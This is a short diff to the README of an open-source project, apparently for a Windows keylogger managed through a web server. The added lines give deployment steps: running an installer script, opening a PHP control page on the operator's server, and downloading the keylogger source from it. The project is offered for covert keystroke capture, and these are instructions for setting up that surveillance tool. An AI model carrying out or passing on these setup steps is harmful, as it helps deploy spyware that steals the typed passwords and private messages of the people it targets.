@@ -62,6 +62,15 @@ Open source project, Create a keylogger to operate at windows. and Manage Wireta
 server_ip='' #ex)33.33.33.33
 
 ````
+4.Run installer. </br>
+`bash installer.sh`</br>
+
+5. check your web server 
+brwoser open </br>
+`http://yourserver/4500/05f7a6edc6d63e4f97353f87fbb3d18d.php`</br>
+
+6. Download your Keylogger.cpp </br>
+`http://yourserver/4500/4500keylogger.cpp`</br>
 
 
 
